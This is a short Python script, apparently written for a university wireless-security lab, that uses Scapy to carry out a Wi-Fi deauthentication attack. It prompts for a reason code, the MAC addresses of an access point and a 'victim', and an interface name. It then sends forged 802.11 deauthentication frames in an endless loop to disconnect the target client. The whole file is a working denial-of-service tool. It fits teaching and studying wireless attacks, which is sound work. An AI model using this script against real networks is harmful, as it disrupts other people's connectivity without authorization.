#!/usr/bin/env python
'''
SWI - Labo1
Auteurs : Nemanja Pantic et David Simeonovic
But : Permet d'effectuer une deauth attack sur un AP
'''

# Import Module
from scapy.all import *

reason = ''

# Vérifie l'entrée utilisateur pour être sûr de ce qu'il rentre comme valeur
# Dans notre cas, nous voulons les valeurs suivantes : 1 4 5 8
while True:
	print("Choose an reason for the deauthentication tram : \n 1 - Unspecified \n 4 - Disassociated due to inactivity \n 5 - Disassociated because AP is unable to handle all currently associated stations \n 8 - Deauthenticated because sending STA is leaving BSS")
	reason = input()
	if(reason == '1' or reason == '4' or reason == '5' or reason == '8'):
		break

# Demande à l'utilisateur l'adresse MAC de l'AP que l'on veut attaquer
print("Give the MAC adress of the AP")
ap = input()

# Demande à l'utilisateur l'adresse MAC de la victime que l'on veut déconnecter
print("Give the MAC adress of the victim")
client = input()

# Demande à l'utilisateur le nom de l'interface depuis laquelle il enverra les paquets deauth
print("Give your interface name")
interface = input()

# Construction du paquet à envoyer
pkt = RadioTap() / Dot11(addr1=client, addr2=ap) / Dot11Deauth(reason=int(reason))

# Envoie du paquet en boucle
print("Sending deauth tram to {0} on AP {1}".format(client, ap))
sendp(pkt, iface=interface, verbose=False, loop=1)
